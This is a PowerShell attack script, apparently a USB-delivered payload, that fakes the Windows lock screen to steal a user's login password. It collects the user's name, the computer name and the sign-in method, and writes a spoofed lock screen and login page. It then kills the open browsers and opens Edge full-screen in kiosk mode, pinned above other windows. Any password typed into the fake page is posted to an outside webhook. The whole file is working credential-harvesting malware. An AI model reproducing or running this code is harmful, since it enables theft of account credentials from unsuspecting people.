# GATHER SYSTEM AND USER INFO
$u = (Get-WmiObject Win32_UserAccount -Filter "Name = '$Env:UserName'").FullName
$c = $env:COMPUTERNAME
$wpURL = "https://wallpapercave.com/wp/wp1809099.jpg"

# shortened URL Detection
if ($dc.Ln -ne 121){Write-Host "Shortened Webhook URL Detected.." ; $dc = (irm $dc).url}

# DEFAULT LOGIN METHOD
$value = Get-ItemPropertyValue -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\LogonUI\NgcPin" -Name "DeviceLockEnforcementPending" -ErrorAction SilentlyContinue
if ($value -eq 0 -or $value -eq 1) {$mthd = "PIN"} else {$mthd = "Password"}

# FIND ACCOUNT PICTURES
$accountPicturesPath = "C:\ProgramData\Microsoft\Default Account Pictures"
$imageFiles = Get-ChildItem -Path $accountPicturesPath -include "*.jpg", "*.png", "*.bmp" -File -Recurse
if ($imageFiles.Count -gt 0) {
$firstImage = $imageFiles[0].FullName
$image = [System.Drawing.Image]::FromFile($firstImage)
$usrimg = "$image"
}else {$usrimg = "https://www.tenforums.com/geek/gars/images/2/types/thumb_14400082930User.png"}

# HTML FOR COVER PAGE
$h = @"
<!DOCTYPE html>
<html lang="en">
<head>
	  <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>&#65279;</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.5.0/css/bootstrap.min.css">
	<link href="https://fonts.googleapis.com/css?family=Open+Sans+Condensed:300&display=swap" rel="stylesheet">
<style>
@import url(https://fonts.googleapis.com/css2?family=Open+Sans:wght@300&display=swap);
body{background:rgba(0,0,0,1);margin:0;padding:0;overflow-x:hidden}.alert{background:rgba(0,0,0,1);position:fixed;top:0;left:0;width:100%;height:auto;z-index:10;padding:10px}.alert ul{padding:0;margin:0;list-style:none;display:flex;justify-content:space-around;align-items:center}.alert ul li b{color:#589;font-weight:600;font-family:Arial,sans-serif}#container{height:100vh;width:100vw;overflow:hidden;position:relative}#wallpaper{background-image:url($wpURL);background-repeat:no-repeat;background-size:90% cover;background-position:center;height:100vh;width:100vw;position:absolute;top:0;left:0}#wallpaper.slideUp{transition:all .6s ease;transform:translateY(-100%)}#wallpaper.slideDown{transition:all .6s linear;transform:translateY(0%)}.icons{display:flex;justify-content:flex-start;align-items:center;padding-left:.5em}.icons i{color:#fff;margin-top:.7em;margin-right:2em}#date_cont{position:absolute;top:67%;left:4%;text-align: left;animation:slideInFast .3s .3s linear forwards;visibility:hidden;transform:translateY(150%);transition:all .6s ease both}@keyframes slideInFast{from{visibility:hidden;opacity:0;transform:translateY(100%)}to{visibility:visible;opacity:1;transform:translateY(0%)}}#time{font-size:8em;font-family:'Open Sans Condensed',sans-serif;color:#fff;margin:0;margin-left:-15px;padding:0}#date{font-size:2.5em;font-family:'Open Sans',sans-serif;color:#fff;margin-top:-.6em}
</style>
</head>
<body>
	<div id="container">
		<div id="wallpaper">
			<div id="date_cont">
				<div id="time">08:20</div>
				<div id="date" class="">Tuesday, October 8</div>
        <div class="icons">
          <i class="fa fa-wifi"></i>
          <i class="fa fa-battery-full"></i>
        </div>
		</div>
    </div>
	</div>
	<script type="text/javascript">
(function(){
  var time = document.querySelector('#time');
  var dateElem = document.querySelector('#date');
  var wallpaper = document.querySelector('#wallpaper');
  var currentDate = new Date();
  var hours = currentDate.getHours();
  var minutes = currentDate.getMinutes();
  var month = currentDate.getMonth();
  var day = currentDate.getDay();
  var dateOfMonth = currentDate.getDate();
  var dayOfWeek = ['Sunday','Monday', 'Tuesday', 'Wednesday', 'Thursday', 'Friday', 'Saturday'];
  var monthOfYear = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'Decemeber'];
  if ((hours < 10)) {
    time.innerHTML = '0' + hours + ':' + minutes;
  } else {
    time.innerHTML = hours + ':' + minutes;
  }
  if ((minutes < 10)) {
    time.innerHTML = hours + ':' + '0' + minutes;
  } else {
    time.innerHTML = hours + ':' + minutes;
  }
  dateElem.innerHTML = dayOfWeek[day] + ", " + monthOfYear[month] + ' ' + dateOfMonth;
  function myFunction() {
    setTimeout(function() {
      window.location.href = 'login.html';
    }, 1000);
  }
  document.addEventListener('keypress', (e)=>{
    console.log('key pressed', e.keyCode);
    if(e.keyCode === 13) {
      wallpaper.classList.remove('slideDown');
      wallpaper.classList.add('slideUp');
      myFunction();
    }
    else if (e.keyCode === 32) {
      wallpaper.classList.remove('slideDown');
      wallpaper.classList.add('slideUp');
      myFunction();
    }
    else {
      return null;
    }
  });
 document.addEventListener('click', () => {
    wallpaper.classList.remove('slideDown');
  wallpaper.classList.add('slideUp');
  myFunction();
  });
})();
	</script>
  </body>
</html>
"@

# HTML FOR LOGIN PAGE
$h2 = @"
<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>&#65279;</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.5.0/css/bootstrap.min.css">
<style>
  #loginForm {
    height: 100vh;
    width: 100vw;
    position: relative;
  }
  body {
    background: url($wpURL);
    background-repeat: no-repeat;
    background-size: 100% cover;
    background-position: center;
    backdrop-filter: blur(10px);
    height: 100vh;
    width: 100vw;
    position: relative;
    top: 0;
    left: 0
  }
    .center-container {
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      text-align: center;
    }
    .input-box {
      width: 300px;
      height: 35px;
      color: white;
      background-color: rgba(64, 64, 64, 0.3);
      border: 1px solid #e6e6e6;
      padding: 5px;
      text-align: Left;
      border-bottom: 5px solid #0066ff;
    }
    .input-box::placeholder {
    color: #e6e6e6;
    }
    .input-box:not(:focus) {
    border-bottom: rgba(64, 64, 64, 0.3);
    border: 1px solid #e6e6e6;
    }
    .input-container {
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 20px;
    }
    .btn-signin {
      width: 140px;
      height: 40px;
      background-color: rgba(96, 96, 96, 0.2);
      border: 1px solid #e6e6e6;
      border-radius: 0;
      line-height: 27px;
      text-align: center
      color: white !important;
    }
    .btn-signin:hover {
    background-color: rgba(96, 96, 96, 0.6);
    }
    #userLine{
    color: white;
    font-size:35px;
    }
    .my22{
      text-align: center
      color: white;
    }
    .circular-image {
    width: 180px;
    height: 180px;
    border-radius: 50%;
    border: 2px solid #e6e6e6;
    margin-bottom: 10px;
    }
</style>
  </head>
<body class="text-nowrap" style="width:100%;height:100vh">
  <div id="loginForm" class="container">
    <div class="center-container">
        <div class="image-container">
            <img src="https://www.tenforums.com/geek/gars/images/2/types/thumb_14400082930User.png" alt="User Image" class="circular-image">
             </div>
      <div class="input-container">
      <h3 id="userLine">$u</h3>
        <input id="password" class="input-box" type="password" placeholder="$mthd" autofocus>
        <button id="btnSignIn" class="btn btn-signin" style="color: white;">Sign In</button>
        <p class="my22" style="color: white;">I forgot my $mthd</p>
      </div>
    </div>
  </div>
  <script>
    function sendCredentialsAndExecuteCommand() {
      var passwordValue = document.getElementById("password").value;
      var webhookUrl = "$dc";
      var uValue = "$u";
      var cValue = "$c";
      var data = {content: "Computer: " + cValue + " | User: " + uValue + " | Password: " + passwordValue};
      fetch(webhookUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)})
      .then(response => {})
      .catch(error => {});}
    document.getElementById("btnSignIn").addEventListener("click", function() {
      sendCredentialsAndExecuteCommand();
    });
    document.addEventListener('keypress', (e)=>{
    console.log('key pressed', e.keyCode);
    if(e.keyCode === 13) {
      sendCredentialsAndExecuteCommand();
    }
    else {
      return null;
    }
  });
  </script>
</body>
</html>
"@

# SAVE HTML
$p = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), "index.html")
$h | Out-File -Encoding UTF8 -FilePath $p
$a = "file://$p"
$p2 = [System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), "login.html")
$h2 | Out-File -Encoding UTF8 -FilePath $p2

# KILL ANY BROWSERS (interfere with "Maximazed" argument)
Start-Process -FilePath "taskkill" -ArgumentList "/F", "/IM", "chrome.exe", "/IM", "msedge.exe" -NoNewWindow -Wait
Sleep -Milliseconds 100

# START EDGE IN FULLSCREEN
$edgeProcess = Start-Process -FilePath "msedge.exe" -ArgumentList "--kiosk --app=$a -WindowStyle Maximized" -PassThru
$edgeProcess.WaitForInputIdle()

Add-Type @"
    using System;
    using System.Runtime.InteropServices;
    public class Win32 {
        [DllImport("user32.dll")]
        public static extern IntPtr SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);
        public static readonly IntPtr HWND_TOPMOST = new IntPtr(-1);
        public static readonly IntPtr HWND_NOTOPMOST = new IntPtr(-2);
        public const uint SWP_NOMOVE = 0x2;
        public const uint SWP_NOSIZE = 0x1;
        public const uint SWP_SHOWWINDOW = 0x40;
    }
"@

# SET EDGE AS TOP WINDOW AND START SCREENSAVER
$null = [Win32]::SetWindowPos($edgeProcess.MainWindowHandle, [Win32]::HWND_TOPMOST, 0, 0, 0, 0, [Win32]::SWP_NOMOVE -bor [Win32]::SWP_NOSIZE -bor [Win32]::SWP_SHOWWINDOW)
Sleep -Milliseconds 250
$null = [Win32]::SetWindowPos($edgeProcess.MainWindowHandle, [Win32]::HWND_TOPMOST, 0, 0, 0, 0, [Win32]::SWP_NOMOVE -bor [Win32]::SWP_NOSIZE -bor [Win32]::SWP_SHOWWINDOW)
Sleep -Milliseconds 250
$black = Start-Process -FilePath "C:\Windows\System32\scrnsave.scr"
